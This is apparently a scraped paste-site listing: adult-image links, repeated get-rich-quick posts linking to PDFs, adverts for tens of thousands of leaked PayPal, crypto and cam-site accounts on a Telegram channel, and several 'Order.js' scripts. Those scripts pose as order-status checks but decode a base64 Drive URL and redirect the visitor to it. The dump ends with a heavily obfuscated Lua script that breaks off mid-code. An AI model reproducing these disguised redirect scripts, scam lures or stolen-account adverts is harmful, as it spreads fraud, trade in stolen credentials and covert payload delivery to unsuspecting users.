href=""https://fappic.com/8gf50iaswmbp/fbes3nb2a3vp.jpg""><img src=""https://img103.fappic.com/i/03921/8gf50iaswmbp_t.jpg""></a><a href=""https://fappic.com/0k9hp0sh2bkk/kjjejp6ralph.jpg""><img src=""https://img103.fappic.com/i/03921/0k9hp0sh2bkk_t.jpg""></a><a href=""https://fappic.com/0lwun24kdojo/p3eg3ls93svx.jpg""><img src=""https://img103.fappic.com/i/03921/0lwun24kdojo_t.jpg""></a><a href=""https://fappic.com/dnevsi3x49ny/k0tusfwabubv.jpg""><img src=""https://img103.fappic.com/i/03921/dnevsi3x49ny_t.jpg""></a><a href=""https://fappic.com/u57nciowwcet/akx9y433gcoz.jpg""><img src=""https://img103.fappic.com/i/03921/u57nciowwcet_t.jpg""></a><a href=""https://fappic.com/xh5bcxm91hq3/wrko6ipjl2aw.jpg""><img src=""https://img103.fappic.com/i/03921/xh5bcxm91hq3_t.jpg""></a><a href=""https://fappic.com/e6w84zyyutqh/kb07p9y3pkwm.jpg""><img src=""https://img103.fappic.com/i/03921/e6w84zyyutqh_t.jpg""></a><a href=""https://fappic.com/696lao9m24p9/g82svymukoe6.jpg""><img src=""https://img103.fappic.com/i/03921/696lao9m24p9_t.jpg""></a><a href=""https://fappic.com/loj1o0fk3r34/irk85uglu79l.jpg""><img src=""https://img103.fappic.com/i/03921/loj1o0fk3r34_t.jpg""></a><a href=""https://fappic.com/5queajp4zlrk/kzv3bckhjueb.jpg""><img src=""https://img103.fappic.com/i/03921/5queajp4zlrk_t.jpg""></a><a href=""https://fappic.com/6peqmtbha05h/2fndbsl4m2gj.jpg""><img src=""https://img103.fappic.com/i/03921/6peqmtbha05h_t.jpg""></a><a href=""https://fappic.com/gbbkt2c8iwpw/oorp7de6y1iy.jpg""><img src=""https://img103.fappic.com/i/03921/gbbkt2c8iwpw_t.jpg""></a><a href=""https://fappic.com/5v4wfd6dhw63/8uqtcr20vbc3.jpg""><img src=""https://img103.fappic.com/i/03921/5v4wfd6dhw63_t.jpg""></a><a href=""https://fappic.com/o1efjfwzr9wv/bka3lzawbd3a.jpg""><img src=""https://img103.fappic.com/i/03921/o1efjfwzr9wv_t.jpg""></a><a href=""https://fappic.com/il1yi1mcimjd/vs559zco0je1.jpg""><img src=""https://img103.fappic.com/i/03921/il1yi1mcimjd_t.jpg""></a><a href=""https://fappic.com/0a2crto2kwfq/835ggtyzvvdb.jpg""><img src=""https://img103.fappic.com/i/03921/0a2crto2kwfq_t.jpg""></a><a href=""https://fappic.com/geyxq5v82ios/0emdwxfobzzj.jpg""><img src=""https://img103.fappic.com/i/03921/geyxq5v82ios_t.jpg""></a><a href=""https://fappic.com/mb4dt8vkrq74/5rc08vw01rkr.jpg""><img src=""https://img103.fappic.com/i/03921/mb4dt8vkrq74_t.jpg""></a><a href=""https://fappic.com/myfj9lzxr453/l9ko3f78u8di.jpg""><img src=""https://img103.fappic.com/i/03921/myfj9lzxr453_t.jpg""></a><a href=""https://fappic.com/vgav2d122dra/gl10waqgjih5.jpg""><img src=""https://img103.fappic.com/i/03921/vgav2d122dra_t.jpg""></a><a href=""https://fappic.com/85jsxkgc8ykn/ayaps7eoo6kj.jpg""><img src=""https://img103.fappic.com/i/03921/85jsxkgc8ykn_t.jpg""></a><a href=""https://fappic.com/6eh7963m8pz8/4jjkncwkd7dc.jpg""><img src=""https://img103.fappic.com/i/03921/6eh7963m8pz8_t.jpg""></a><a href=""https://fappic.com/t2042np2i5sf/eo5b8ej7djhp.jpg""><img src=""https://img103.fappic.com/i/03921/t2042np2i5sf_t.jpg""></a><a href=""https://fappic.com/j3d42ec8xqcr/wmlm1z7e14a2.jpg""><img src=""https://img103.fappic.com/i/03921/j3d42ec8xqcr_t.jpg""></a><a href=""https://fappic.com/uuzgctewqtxd/ywy9yiws2z1m.jpg""><img src=""https://img103.fappic.com/i/03921/uuzgctewqtxd_t.jpg""></a><a href=""https://fappic.com/sc9zvf2i70r2/nq1zaagtvmoz.jpg""><img src=""https://img103.fappic.com/i/03921/sc9zvf2i70r2_t.jpg""></a><a href=""https://fappic.com/4hkoz6skmryo/eb53lv3q2ufc.jpg""><img src=""https://img103.fappic.com/i/03921/4hkoz6skmryo_t.jpg""></a><a href=""https://fappic.com/5so4ilxcxqk9/ptyvnhab89p7.jpg""><img src=""https://img103.fappic.com/i/03921/5so4ilxcxqk9_t.jpg""></a><a href=""https://fappic.com/cq7qgxduki7d/dnklv38rh9f0.jpg""><img src=""https://img103.fappic.com/i/03921/cq7qgxduki7d_t.jpg""></a><a href=""https://fappic.com/qltkx2upwm8y/0yi2toc1317p.jpg""><img src=""https://img103.fappic.com/i/03921/qltkx2upwm8y_t.jpg""></a><a href=""https://fappic.com/vfsjel8z9wim/ml9wchzhspho.jpg""><img src=""https://img103.fappic.com/i/03921/vfsjel8z9wim_t.jpg""></a><a href=""https://fappic.com/yjonfh1g03g2/1a843yuu60cw.jpg""><img src=""https://img103.fappic.com/i/03921/yjonfh1g03g2_t.jpg""></a><a href=""https://fappic.com/kck2yl7mmtoz/h7cu562vkeb5.jpg""><img src=""https://img103.fappic.com/i/03921/kck2yl7mmtoz_t.jpg""></a><a href=""https://fappic.com/kchqetnqm5if/k830my8uodqm.jpg""><img src=""https://img103.fappic.com/i/03921/kchqetnqm5if_t.jpg""></a><a href=""https://fappic.com/u8jqxhr35u6n/d251y7sa8w0k.jpg""><img src=""https://img103.fappic.com/i/03921/u8jqxhr35u6n_t.jpg""></a><a href=""https://fappic.com/kqk7vr6r74v2/cugj563eu6n0.jpg""><img src=""https://img103.fappic.com/i/03921/kqk7vr6r74v2_t.jpg""></a><a href=""https://fappic.com/dlm1y5sp7h06/i56ignpzwidx.jpg""><img src=""https://img103.fappic.com/i/03921/dlm1y5sp7h06_t.jpg""></a><a href=""https://fappic.com/7prt27thef9v/z5iy790t099q.jpg""><img src=""https://img103.fappic.com/i/03921/7prt27thef9v_t.jpg""></a><a href=""https://fappic.com/wiqod3gxcdnb/480tna6qhpiq.jpg""><img src=""https://img103.fappic.com/i/03921/wiqod3gxcdnb_t.jpg""></a><a href=""https://fappic.com/69dfjzrczlv0/gsigf18rzmbu.jpg""><img src=""https://img103.fappic.com/i/03921/69dfjzrczlv0_t.jpg""></a><a href=""https://fappic.com/ypet9b4zqrj0/dk4y0g3zvnkg.jpg""><img src=""https://img103.fappic.com/i/03921/ypet9b4zqrj0_t.jpg""></a><a href=""https://fappic.com/n5jo8s9yzaib/fhrkg484a96g.jpg""><img src=""https://img103.fappic.com/i/03921/n5jo8s9yzaib_t.jpg""></a><a href=""https://fappic.com/gdtwxnfzykgh/ad2qak4kuti4.jpg""><img src=""https://img103.fappic.com/i/03921/gdtwxnfzykgh_t.jpg""></a><a href=""https://fappic.com/n0jxz8p8abzx/rsmybsb5u1z8.jpg""><img src=""https://img103.fappic.com/i/03921/n0jxz8p8abzx_t.jpg""></a><a href=""https://fappic.com/hwbriia3ohxm/0nwe7kyvbtau.jpg""><img src=""https://img103.fappic.com/i/03921/hwbriia3ohxm_t.jpg""></a><a href=""https://fappic.com/701arolfv6wi/891087udmw22.jpg""><img src=""https://img103.fappic.com/i/03921/701arolfv6wi_t.jpg""></a><a href=""https://fappic.com/83r02dfgzrth/kpnajc8fc5l9.jpg""><img src=""https://img103.fappic.com/i/03921/83r02dfgzrth_t.jpg""></a><a href=""https://fappic.com/twdty15y9ux7/mqnul8etf6v1.jpg""><img src=""https://img103.fappic.com/i/03921/twdty15y9ux7_t.jpg""></a><a href=""https://fappic.com/xagp9m6eecff/vmh011mr737x.jpg""><img src=""https://img103.fappic.com/i/03921/xagp9m6eecff_t.jpg""></a><a href=""https://fappic.com/k4j8jtqqxy0a/azgl3hc6denw.jpg""><img src=""https://img103.fappic.com/i/03921/k4j8jtqqxy0a_t.jpg""></a><a href=""https://fappic.com/o37kh0z73j8l/m6p4gt9kz5hk.jpg""><img src=""https://img103.fappic.com/i/03921/o37kh0z73j8l_t.jpg""></a><a href=""https://fappic.com/tdwc2xs71ymw/i70ad1rw4j3e.jpg""><img src=""https://img103.fappic.com/i/03921/tdwc2xs71ymw_t.jpg""></a>
"
6XVE7muH,Make $1000 15-MINUTES  (BEGINNER) ME,jrgsdv,JavaScript,Sunday 27th of April 2025 12:28:50 AM CDT," 
Pdf https://tinyurl.com/privguidee

5NsvNevbEw
"
PR4kxYuk,Order.js,dentira,JavaScript,Sunday 27th of April 2025 12:27:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/11336/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WbnBVYwU,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Sunday 27th of April 2025 12:22:27 AM CDT,57955 Accounts Posted On https://t.me/leakedbyem1nem
V6XfvMSS,EARN $900 INSTANTLY 2025 M6,jrgsdv,JavaScript,Sunday 27th of April 2025 12:19:34 AM CDT," 
Pdf https://tinyurl.com/privguidee

bCp0cnQ68Q
"
NY5EcH6Y,"[Uncovere$8,000 in 2 Weeks Why Isnt Everyone Doing This? YP 6VM",Orpheus017,JavaScript,Sunday 27th of April 2025 12:12:34 AM CDT,"https://www.dropbox.com/scl/fi/4uyh6imj04x0mf5ppr678/new.pdf?rlkey=9lt2n0d54wwto1kre3xarjuhc&st=gj2olh50&dl=0


6ZG2TE"
Md1c8xwj,Market.js,dentira,JavaScript,Sunday 27th of April 2025 12:11:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38453/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Kt59KStb,"[Lazy Method] Earn $4,000 Monthly with Almost No Work HF L7A",anantsoftcomputing,JavaScript,Sunday 27th of April 2025 12:11:20 AM CDT,"https://www.dropbox.com/scl/fi/4uyh6imj04x0mf5ppr678/new.pdf?rlkey=9lt2n0d54wwto1kre3xarjuhc&st=gj2olh50&dl=0


BL78NB"
1b4spRQH,Make $1000 15-MINUTES (BEGINNER) 96,jrgsdv,JavaScript,Sunday 27th of April 2025 12:10:15 AM CDT," 
Pdf https://tinyurl.com/privguidee

GP9Fve338t
"
6twSJ3A3,Crypto Accounts,Ratqueenkslskskwkw,JavaScript,Sunday 27th of April 2025 12:07:04 AM CDT,14965 Accounts Posted On https://t.me/leakedbyem1nem
KMYw8NZD,"[Zero Effort] Earn $3,000 a Month Without Leaving Your House 64OA",Orpheus017,JavaScript,Sunday 27th of April 2025 12:06:45 AM CDT,"https://www.dropbox.com/scl/fi/4uyh6imj04x0mf5ppr678/new.pdf?rlkey=9lt2n0d54wwto1kre3xarjuhc&st=gj2olh50&dl=0

AJR64W"
RJLjPC14,Untitled,dentira,JavaScript,Saturday 26th of April 2025 11:56:10 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33903/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MxbTkmYL,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Saturday 26th of April 2025 11:51:41 PM CDT,20320 Accounts Posted On https://t.me/leakedbyem1nem
P44m5uPj,Products.js,dentira,JavaScript,Saturday 26th of April 2025 11:40:48 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45301/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
24aQvLJA,Leaked Accounts - Fresh Hits,Ratqueenkslskskwkw,JavaScript,Saturday 26th of April 2025 11:36:19 PM CDT,07599 Accounts Posted On https://t.me/leakedbyem1nem
bTFzvYcw,good,RedRich_Dawn,Lua,Saturday 26th of April 2025 11:29:31 PM CDT,"([[This file was protected with MoonSec V3]]):gsub('.+', (function(a) _WdLihgisVGet = a; end)); return(function(r,...)local t;local h;local o;local f;local a;local d;local e=24915;local n=0;local l={};while n<691 do n=n+1;while n<0x12f and e%0x483c<0x241e do n=n+1 e=(e*555)%22813 local c=n+e if(e%0x10ee)<=0x877 then e=(e*0x158)%0x9b92 while n<0x287 and e%0x4932<0x2499 do n=n+1 e=(e-110)%16506 local d=n+e if(e%0x1b96)<=0xdcb then e=(e*0x9c)%0x6393 local e=94449 if not l[e]then l[e]=0x1 t=(not t)and _ENV or t;end elseif e%2~=0 then e=(e-0xf2)%0x673 local e=18872 if not l[e]then l[e]=0x1 h=tonumber;end else e=(e-0x3af)%0x8a1 n=n+1 local e=20467 if not l[e]then l[e]=0x1 t=getfenv and getfenv();end end end elseif e%2~=0 then e=(e*0x16a)%0x7158 while n<0xf1 and e%0x1496<0xa4b do n=n+1 e=(e*803)%16095 local c=n+e if(e%0x35a6)>=0x1ad3 then e=(e*0x204)%0x2dba local e=86442 if not l[e]then l[e]=0x1 o={};end elseif e%2~=0 then e=(e*0x295)%0x358a local e=67742 if not l[e]then l[e]=0x1 d=function(l)local e=0x01 local function n(n)e=e+n return l:sub(e-n,e-0x01)end while true do local l=n(0x01)if(l==""\5"")then break end local e=a.byte(n(0x01))local e=n(e)if l==""\2""then e=o.fFqSFoFm(e)elseif l==""\3""then e=e~=""\0""elseif l==""\6""then t[e]=function(e,n)return r(8,nil,r,n,e)end elseif l==""\4""then e=t[e]elseif l==""\0""then e=t[e][n(a.byte(n(0x01)))];end local n=n(0x08)o[n]=e end end end else e=(e*0x3e9)%0xa4b7 n=n+1 local e=38576 if not l[e]then l[e]=0x1 f=""\4\8\116\111\110\117\109\98\101\114\102\70\113\83\70\111\70\109\0\6\115\116\114\105\110\103\4\99\104\97\114\101\116\112\65\99\116\84\120\0\6\115\116\114\105\110\103\3\115\117\98\70\102\116\117\72\109\112\82\0\6\115\116\114\105\110\103\4\98\121\116\101\65\112\110\86\75\67\72\103\0\5\116\97\98\108\101\6\99\111\110\99\97\116\102\77\75\109\85\66\105\97\0\5\116\97\98\108\101\6\105\110\115\101\114\116\121\81\85\98\76\103\79\99\5"";end end end else e=(e-0x1e)%0x34b n=n+1 while n<0x281 and e%0x35c8<0x1ae4 do n=n+1 e=(e+306)%48501 local t=n+e if(e%0x4d62)<0x26b1 then e=(e*0x6e)%0x2bf7 local e=30471 if not l[e]then l[e]=0x1 a=string;end elseif e%2~=0 then e=(e*0x200)%0x75e9 local e=32119 if not l[e]then l[e]=0x1 end else e=(e-0xc3)%0x1d4d n=n+1 local e=52874 if not l[e]then l[e]=0x1 end end end end end e=(e-794)%29897 end d(f);local e={};for n=0x0,0xff do local l=o.etpActTx(n);e[n]=l;e[l]=n;end local function c(n)return e[n];end local a=(function(f,d)local a,l=0x01,0x10 local n={{},{},{}}local t=-0x01 local e=0x01 local r=f while true do n[0x03][o.FftuHmpR(d,e,(function()e=a+e return e-0x01 end)())]=(function()t=t+0x01 return t end)()if t==(0x0f)then t=""""l=0x000 break end end local t=#d while e<t+0x01 do n[0x02][l]=o.FftuHmpR(d,e,(function()e=a+e return e-0x01 end)())l=l+0x01 if l%0x02==0x00 then l=0x00 o.yQUbLgOc(n[0x01],(c((((n[0x03][n[0x02][0x00]]or 0x00)*0x10)+(n[0x03][n[0x02][0x01]]or 0x00)+r)%0x100)));r=f+r;end end return o.fMKmUBia(n[0x01])end);d(a(64,""8Am+:_r<KHlQCs5NC_""));d(a(241,""MUIsTt_)Yom5n7,*S*ITm+5457ns7)7*Y5*mUmIUssstIYtT_*)}_T_7m*T,t,7Y7m,)ZUUHI_IYI=sYTkTY_s_nIns*5onm7q,T*o,)b)U5IIUoTytoTnqnIUo7m75mn;7T7nYoyqdsItIss)IoT_s7)d_so,mn5)t__o,U,Td_fo5tI5sITI_T_5_U)U)IY)5mnsnsnnY_o7UsUTsIsmTUt*t5)7)oYomImmonnt7_nI(s,*UcHT7H,IT-t,_5Y5otm)))nInnn),5*,4YIt*,n*7,_+to)RYmYoonYommmm7_nn7ko*m7*TI7ITt)_tT*toY,o,T_to7T7,*U4Uu,UTIYscUm_i) T7_n)Lo)ost!_T,I7,,,l)<*5*s7Ttt_t__)),)5mtoYmo5)5=*_*mo,m*I7stT_T_t)_,t7_5Ytm*oI7)nT7tY,o,UYIoI*TstYt,)nt7__onY-555T_*Y *n*7UsU5IYTYToT5_)YIYmmtYU5yt5_,,_,o951,5mIms*tU_y)I_I_UY*)75)nU5_ntYn""));local e=(-23490+(function()local o,e=0,1;(function(l,n,t,e)t(n(e,e,l,e)and e(t,n,e,t),n(n,n,e,n),l(l,l and t,l and l,e),t(e,t and n,t,l))end)(function(d,l,t,n)if o>225 then return n end o=o+1 e=(e-705)%1216 if(e%1956)>=978 then e=(e+598)%12553 return l else return t(t(t and t,t,l,n),d(d,l and n,d,l),d(l,l and t,n,n),n(l,n,n and d,d))end return t(d(n,n and n,l,t and l)and l(d,d,t,n),l(d,t,n,d and d),t(t,l and n,n,n),l(l,n,d and t,t))end,function(n,l,t,d)if o>312 then return n end o=o+1 e=(e+453)%42093 if(e%1730)>865 then e=(e-40)%24141 return n(d(n,d,l,l and n),t(t,d and t,l,l),d(d and l,t,d,d)and l(n and t,n,l,t),n(n,t,n,t))else return l end return l end,function(n,l,t,d)if o>159 then return n end o=o+1 e=(e*58)%4606 if(e%1270)>635 then e=(e+964)%39571 return n else return t(l(t,d,n,n),d(t and n,n and d,l,t),d(n,n,t,l),l(n,l,d,t))end return n(t(l,l,l,n),n(l,t,d,l),d(d,l,l,t),t(l,n,l,t)and d(n,t,t,d))end,function(d,t,l,n)if o>465 then return l end o=o+1 e=(e*32)%34617 if(e%628)<314 then e=(e-451)%30322 return l else return n(n(d and d,t,t,t),n(n and n,d,l,n),l(t,n,l and n,t),n(t and t,t,t,l))end return l(d(d,d and l,l,l),l(t,n,n,n and d),d(n,n and l,n and t,l),n(l,t and t,d,d))end)return e;end)())local u=o.KJUpDzXZ or o.YtXZYCzo;local de=(getfenv)or(function()return _ENV end);local te=1;local c=4;local d=3;local t=2;local function j(_,...)local s=a(e,""DpxQgIJ7v0XM_R^l_0vggJOv_MMQg^pLRx^vM^vpgRM__gv0g^>0vJ0lgMplv^XHJgxQ^X0RIRQT^QXgxxQM^lM_7x^_RMMlvpgx^0MR7Rl_lg0QxQlRXJJvxXQ0pRRlXNg7pMRM00glQxlxXM7xxRlM0x7IQxlgM7vxp7U__^v^RllXJxxg^JphR^XiI^xQX_JQxIxXRMMQx_x7^MMvJ^QR^__pvpQIfgM7vIgJL^_pv_IgR(_70IIIR0M^0QIg!gRR00J9l^RRMIJ^lpRJXMJ_p_lIMp7vpJlI_RvJPvsQ_70ggXp0_vIJIQpM0RXxI7pX^0J7JxxpRlXg7IlQlXXR7Rg;MRMv7MWxAx_R7MRRXxJ/xx^gzR_007IpXl7XQxlgMJ^gX0IRxxlQMJ7JxllJMp8RRI0?Ixpgp^-__^v_xIOIRJxIlQXvJXx_gR57RJvnIlxG^pXI7ppJ_0X07XR7vXg_b^R(XgIgpJRv0MI_p^^+Mg77xJ^vXXJ^x^l3MxvJgRlvMX7_gIZ;_xvgJ_pg_Xv_g^pJRx0IIJp0RXX*J^xn^xXgJ_xv^MX_7xgElxMg7JQllXMR7^g{pv_gvJgv8M__v^I{xgR70JIvpX^p0^J!xxlJX_JvxM^_Mx7(QxlgRJvxQXlRM^vpgxOX_J0XJIE_Rp0sIIpgRJ0vIXQpR^XpJxx7^JXvJXx_l7Mf7xQglJMv7_Q_l^RJvxggFJ_0vXgR&^R*XXIgpJRv0MI_p^^dXxJgxJ^vXX"");local n=0;o.sfOXQJVP(function()o.dhFXIfMB()n=n+1 end)local function e(e,l)if l then return n end;n=e+n;end local l,n,f=r(0,r,e,s,o.ApnVKCHg);local function a()local l,n=o.ApnVKCHg(s,e(1,3),e(5,6)+2);e(2);return(n*256)+l;end;local p=true;local p=0 local function m()local e=n();local n=n();local d=1;local t=(l(n,1,20)*(2^32))+e;local e=l(n,21,31);local n=((-1)^l(n,32));if(e==0)then if(t==p)then return n*0;else e=1;d=0;end;elseif(e==2047)then return(t==0)and(n*(1/0))or(n*(0/0));end;return o.WXJPtn_Y(n,e-1023)*(d+(t/(2^52)));end;local g=n;local function b(n)local l;if(not n)then n=g();if(n==0)then return'';end;end;l=o.FftuHmpR(s,e(1,3),e(5,6)+n-1);e(n)local e=""""for n=(1+p),#l do e=e..o.FftuHmpR(l,n,n)end return e;end;local p=#o.ByzHXMeR(h('\49.\48'))~=1 local e=n;local function y(...)return{...},o.fYfrkwDd('#',...)end local function ee()local h={};local u={};local e={};local s={h,u,nil,e};local e=n()local r={}for t=1,e do local l=f();local e;if(l==3)then e=(f()~=#{});elseif(l==2)then local n=m();if p and o.KYAeIutp(o.ByzHXMeR(n),'.(\48+)$')then n=o.SCbAlgMM(n);end e=n;elseif(l==1)then e=b();end;r[t]=e;end;for u=1,n()do local e=f();if(l(e,1,1)==0)then local o=l(e,2,3);local f=l(e,4,6);local e={a(),a(),nil,nil};if(o==0)then e[d]=a();e[c]=a();elseif(o==#{1})then e[d]=n();elseif(o==_[2])then e[d]=n()-(2^16)elseif(o==_[3])then e[d]=n()-(2^16)e[c]=a();end;if(l(f,1,1)==1)then e[t]=r[e[t]]end if(l(f,2,2)==1)then e[d]=r[e[d]]end if(l(f,3,3)==1)then e[c]=r[e[c]]end h[u]=e;end end;for e=1,n()do u[e-(#{1})]=ee();end;s[3]=f();return s;end;local function ne(l,n,e)local t=n;local t=e;return h(o.KYAeIutp(o.KYAeIutp(({o.sfOXQJVP(l)})[2],n),e))end local function le(p,e,h)local function ee(...)local a,j,s,k,_,l,f,m,g,b,z,n;local e=0;while-1<e do if 2>=e then if e<1 then a=r(6,30,1,67,p);j=r(6,99,2,66,p);else if e>=-2 then repeat if e~=1 then l=-41;f=-1;break;end;s=r(6,77,3,87,p);_=y k=0;until true;else l=-41;f=-1;end end else if 5<=e then if e==6 then e=-2;else n=r(7);end else if 3<e then b=o.fYfrkwDd('#',...)-1;z={};else m={};g={...};end end end e=e+1;end;for e=0,b do if(e>=s)then m[e-s]=g[e+1];else n[e]=g[e+1];end;end;local e=b-s+1 local e;local o;local function r(...)while true do end end while true do if l<-40 then l=l+42 end e=a[l];o=e[te];if o>11 then if o<=17 then if 15>o then if o>=13 then if 14==o then h[e[d]]=n[e[t]];else local e=e[t]n[e]=n[e](u(n,e+1,f))end else l=e[d];end else if o<16 then n[e[t]]=(e[d]~=0);else if 17~=o then l=e[d];else if(n[e[t]]==e[c])then l=l+1;else l=e[d];end;end end end else if 20<o then if 21>=o then local r,o,f,c,a;local l=0;while l>-1 do if 2<l then if 5>l then if l~=0 then repeat if 4>l then c=r[f];break;end;a=r[o];until true;else a=r[o];end else if 1~=l then for e=31,59 do if 6>l then n(a,c);break;end;l=-2;break;end;else l=-2;end end else if l>=1 then if-2<=l then repeat if 1<l then f=d;break;end;o=t;until true;else o=t;end else r=e;end end l=l+1 end else if o==23 then do return end;else do return end;end end else if 19<=o then if 20>o then local l=e[t]local t,e=_(n[l](u(n,l+1,e[d])))f=e+l-1 local e=0;for l=l,f do e=e+1;n[l]=t[e];end;else local l=e[t]local t,e=_(n[l](u(n,l+1,e[d])))f=e+l-1 local e=0;for l=l,f do e=e+1;n[l]=t[e];end;end else for o=0,3 do if 1>=o then if-2<=o then repeat if o~=0 then h[e[d]]=n[e[t]];l=l+1;e=a[l];break;end;n[e[t]]=(e[d]~=0);l=l+1;e=a[l];until true;else h[e[d]]=n[e[t]];l=l+1;e=a[l];end else if o<3 then n[e[t]]=h[e[d]];l=l+1;e=a[l];else if(n[e[t]]==e[c])then l=l+1;else l=e[d];end;end end end end end end else if 5<o then if 9>o then if o>6 then if o<8 then local t=e[t];local l=n[e[d]];n[t+1]=l;n[t]=l[e[c]];else if(n[e[t]]==e[c])then l=l+1;else l=e[d];end;end else local r,m,p,z,g,b,k,o,y,j,s;n[e[t]]=h[e[d]];l=l+1;e=a[l];r=e[t];m=n[e[d]];n[r+1]=m;n[r]=m[e[c]];l=l+1;e=a[l];o=0;while o>-1 do if 3>o then if o>0 then if 0~=o then for e=30,64 do if 2~=o then z=t;break;end;g=d;break;end;else g=d;end else p=e;end else if 4<o then if 3<o then repeat if 6~=o then n(k,b);break;end;o=-2;until true;else o=-2;end else if 1~=o then for e=10,88 do if o~=3 then k=p[z];break;end;b=p[g];break;end;else b=p[g];end end end o=o+1 end l=l+1;e=a[l];r=e[t]y,j=_(n[r](u(n,r+1,e[d])))f=j+r-1 s=0;for e=r,f do s=s+1;n[e]=y[s];end;l=l+1;e=a[l];r=e[t]n[r]=n[r](u(n,r+1,f))l=l+1;e=a[l];n[e[t]]();l=l+1;e=a[l];do return end;end else if o>=10 then if 7<=o then repeat if 10<o then local e=e[t]n[e]=n[e](u(n,e+1,f))break;end;n[e[t]]=(e[d]~=0);until true;else local e=e[t]n[e]=n[e](u(n,e+1,f))end else local o,f,a,c,r;local l=0;while l>-1 do if l>2 then if 4>=l then if l<4 then c=o[a];else r=o[f];end else if 6>l then n(r,c);else l=-2;end end else if l<=0 then o=e;else if 1<l then a=d;else f=t;end end end l=l+1 end end end else if 2>=o then if o<1 then h[e[d]]=n[e[t]];else if o>-3 then repeat if o<2 then n[e[t]]=h[e[d]];break;end;local t=e[t];local l=n[e[d]];n[t+1]=l;n[t]=l[e[c]];until true;else local t=e[t];local l=n[e[d]];n[t+1]=l;n[t]=l[e[c]];end end else if 3>=o then n[e[t]]=h[e[d]];else if o>=2 then for l=49,88 do if o~=5 then n[e[t]]();break;end;n[e[t]]();break;end;else n[e[t]]();end end end end end l=1+l;end;end;return ee end;local t=0xff;local c={};local a=(1);local d='';(function(n)local l=n local r=0x00 local e=0x00 l={(function(f)if r>0x25 then return f end r=r+1 e=(e+0xca0-f)%0x1c return(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xa0);d={d..'\58 a',d};c[a]=ee();a=a+((not o.cGdpbGAt)and 1 or 0);d[1]='\58'..d[1];t[2]=0xff;end return true end)'atEtf'and l[0x2](0x2a4+f))or(e%0x03==0x1 and(function(l)if not n[l]then 